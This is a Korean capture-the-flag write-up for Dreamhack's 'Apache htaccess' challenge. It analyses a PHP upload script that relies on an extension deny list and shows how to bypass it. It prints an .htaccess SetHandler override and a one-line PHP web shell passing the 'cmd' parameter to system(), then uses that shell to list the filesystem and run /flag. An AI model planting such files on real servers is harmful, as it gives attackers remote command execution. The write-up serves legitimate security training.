# [Dreamhack Wargame] Apache htaccess
### [🚩Apache htaccess](https://dreamhack.io/wargame/challenges/418/)
  <img width="1071" alt="Apache htaccess_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/811de14b-5ae5-49e4-b5e7-e9be87b01860">

<br/><br/>

## 문제 파일(upload.php) 분석
```php
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml"); // 필터링할 확장자 리스트

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name); // 파일 이름을 "."을 기준으로 분할함
        $extension = end($temp); // 분할한 결과의 마지막 요소(확장자)를 가져옴
       
        if(in_array($extension, $deniedExts)){ // 필터링할 확장자의 목록에 현재 파일의 확장자가 포함되어 있는 경우
            die($extension . " extension file is not allowed to upload ! "); // 업로드 불가능
        }else{ // 필터링할 확장자의 목록에 현재 파일의 확장자가 포함되어 있지 않은 경우
            move_uploaded_file($tmp_name, "upload/" . $name); // 입력받은 파일 이름을 이용해 /upload/ 경로에 파일을 업로드함
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>"; // 파일 업로드 위치를 화면에 출력함
        }
    }
}else {
    echo "File is not selected";
}
?>
```
* 문제 파일 분석에 필요한 php 개념
    - ```explode``` 함수: 문자열을 주어진 인자 값을 기준으로 분할하는 함수
        ```php
        explode(string $separator, string $string, int $limit = PHP_INT_MAX): array
        ```
        + 문자열 구분 기호($separator)을 기준으로 문자열($string)을 분할하여 형성된 문자열의 배열을 반환함
        + 참고: 📚 [PHP: explode - Manual](https://www.php.net/manual/en/function.explode.php)
    - ```end``` 함수: 배열의 내부 포인터를 마지막 요소로 설정하는 함수
        ```php
        end(array|object &$array): mixed
        ```
        + 배열의 내부 포인터를 마지막 요소로 이동하고 해당 값을 반환함
        + 참고: 📚 [PHP: end - Manual](https://www.php.net/manual/en/function.end)

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
php, php3, php4 등의 확장자를 필터링하고 있지만 .htaccess 파일을 사용해 설정 파일을 관리하고 있으므로 이를 이용해 ```.php``` 확장자 외의 다른 확장자를 PHP 스크립트로 해석하도록 만들어 확장자 우회를 통해 웹 셸을 실행시킬 수 있음

<br/><br/>

### 익스플로잇
1. 아래의 내용이 들어간 .htaccess 파일을 만들고 이를 업로드함
    ```Apache
    <Files "exploit.test">
        SetHandler application/x-httpd-php
    </Files>
    ```
    - exploit.test라는 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 실행되므로 PHP 스크립트로 해석하여 이를 실행함

2. 아래와 같이 exploit.test 파일을 만들고 이 웹 셸을 업로드함
    ```php
    // exploit.test
    <?php
        system($_GET['cmd']);
    ?>
    ```
    + 업로드된 웹 셸 파일은 ```/upload/exploit.test```에 존재함

3. ```upload/exploit.test```의 cmd 파라미터 값으로 플래그를 획득하기 위한 명령어를 입력함
    - ```cmd``` 파라미터의 값으로 ```ls -al /```을 입력한 후 요청을 보내 플래그 파일의 위치를 찾음
        +  ```/flag```에 플래그 파일이 존재하며, 실행 권한만 존재하기 때문에 플래그 파일을 실행해야 플래그를 획득할 수 있음을 알 수 있음
    - 플래그 파일의 실행을 위해 ```cmd``` 파라미터의 값으로 ```/flag```를 입력한 후 요청을 보내면 플래그 파일이 실행되어 플래그를 획득할 수 있음


